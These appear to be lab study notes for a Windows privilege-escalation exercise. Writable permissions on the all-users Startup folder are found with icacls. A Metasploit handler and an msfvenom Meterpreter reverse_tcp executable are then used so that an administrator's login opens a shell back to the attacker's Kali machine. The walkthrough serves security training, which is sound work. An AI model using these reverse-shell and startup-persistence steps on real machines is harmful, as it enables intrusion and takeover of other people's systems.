**Detection**  

Windows VM

1. Open command prompt and type: 

```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 
```

![[Pasted image 20240206202407.png]]

2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.

**Exploitation**

Kali VM

1. Open command prompt and type: 

```
msfconsole
```
 
2. In Metasploit (msf > prompt) type:
``
```
use multi/handler
```
   
   
3. In Metasploit (msf > prompt) type: 

```
set payload windows/meterpreter/reverse_tcp
```
   
4. In Metasploit (msf > prompt) type: 

```
set lhost [Kali VM IP Address]
```


5. In Metasploit (msf > prompt) type: 
```
run
```

![[Pasted image 20240206222948.png]]

6. Open another command prompt and type: 

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
```

![[Pasted image 20240206223512.png]]

  
**7. Copy the generated file, x.exe, to the Windows VM.

![[Pasted image 20240206224443.png]]


Windows VM

1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.  

![[Pasted image 20240206224631.png]]


2. Logoff.  
3. Login with the administrator account credentials.

Kali VM

1. Wait for a session to be created, it may take a few seconds.  
2. In Meterpreter(meterpreter > prompt) type: getuid  

![[Pasted image 20240206224920.png]]


1. From the output, notice the user is “User-PC\Admin”

Answer the questions below

Click 'Completed' once you have successfully elevated the machine